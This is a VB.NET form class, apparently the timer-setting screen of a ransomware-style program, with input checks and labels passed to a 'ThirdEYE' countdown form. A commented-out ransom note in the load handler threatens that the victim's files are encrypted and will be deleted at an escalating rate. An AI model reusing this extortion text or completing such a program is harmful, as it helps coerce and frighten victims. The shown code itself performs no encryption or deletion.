Imports System.Text.RegularExpressions
Public Class Ransomwares
    Dim hour As Double
    Dim minute As Double
    Dim second As Double
    Dim i As Integer
    Dim strmsg As String

    Private Sub Ransomwares_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        'strmsg = "I want to play a game with you. Let me explain the rules:" + Environment.NewLine + "Your personal files are being deleted. Your photos, videos, documents, etc..." + Environment.NewLine + "But, don't worry! It will only happen if you don't comply." + Environment.NewLine + "Howeever I've already encrypted your personal files, so you cannot access them." + Environment.NewLine + Environment.NewLine + "Every hour I select some of them to delete permanently," + Environment.NewLine + "therefore I won't be able to access them, either." + Environment.NewLine + "Are you familiar with the concept of exponential growth? Let me help you out." + Environment.NewLine + "It starts out slowly then increases rapidly." + Environment.NewLine + "During the first 24hour you will only lose a few files," + Environment.NewLine + "the second day a few hundred, the third day a few thousand, and so on." + Environment.NewLine + Environment.NewLine + "If you turn off your computer or try to close me, when I start next time" + Environment.NewLine + "you will get 1000 files deleted as a punishment." + Environment.NewLine + "Yes you will want me to start next time, since I am the only one that is capable to " + Environment.NewLine + "decrypt your personal data for you." + Environment.NewLine + "                         Now, let's start and enjoy our little game together!"
        'Timer1.Enabled = True
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        If TextBox1.Text.Trim = "" Then
            MessageBox.Show("Fill in an Hour (Digits Only)", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Exit Sub
        End If
        hour = TextBox1.Text
        ThirdEYE.Label2.Text = hour
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        If TextBox2.Text.Trim = "" Then
            MessageBox.Show("Please, Input a Minute (Digits Only)", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Exit Sub
        End If
        minute = TextBox2.Text
        ThirdEYE.Label4.Text = minute
    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked = True Then
            second = 60
            ThirdEYE.Label1.Text = second
        Else
            ThirdEYE.Label1.Text = "00"
        End If
    End Sub

    Private Sub TextBox1_KeyPress(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyPressEventArgs) Handles TextBox1.KeyPress
        If Not Char.IsNumber(e.KeyChar) AndAlso Not Char.IsControl(e.KeyChar) Then
            e.Handled = True
        End If
    End Sub

    Private Sub TextBox1_TextChanged(ByVal sender As Object, ByVal e As System.EventArgs) Handles TextBox1.TextChanged
        Dim digitsOnly As Regex = New Regex("[^\d]")
        TextBox1.Text = digitsOnly.Replace(TextBox1.Text, "")
        Dim intValue As Integer
        If Integer.TryParse(TextBox1.Text, intValue) AndAlso intValue >= 0 AndAlso intValue <= 900 Then
        Else
            MessageBox.Show("Input Hours Are MAX Of 900 hrs And MIN Of 0 hrs", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error)
            TextBox1.Text = ""
        End If
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        ThirdEYE.Show()
    End Sub

    Private Sub TextBox2_KeyPress(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyPressEventArgs) Handles TextBox2.KeyPress
        If Not Char.IsNumber(e.KeyChar) AndAlso Not Char.IsControl(e.KeyChar) Then
            e.Handled = True
        End If
    End Sub

    Private Sub TextBox2_TextChanged(ByVal sender As Object, ByVal e As System.EventArgs) Handles TextBox2.TextChanged
        Dim digitsOnly As Regex = New Regex("[^\d]")
        TextBox2.Text = digitsOnly.Replace(TextBox2.Text, "")
        Dim intValue As Integer
        If Integer.TryParse(TextBox2.Text, intValue) AndAlso intValue >= 0 AndAlso intValue <= 60 Then
        Else
            MessageBox.Show("Input Minutes Are MAX Of 60 min And MIN Of 0 min", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error)
            TextBox2.Text = ""
        End If
    End Sub

    Private Sub Button4_Click_1(sender As Object, e As EventArgs) Handles Button4.Click

    End Sub
End Class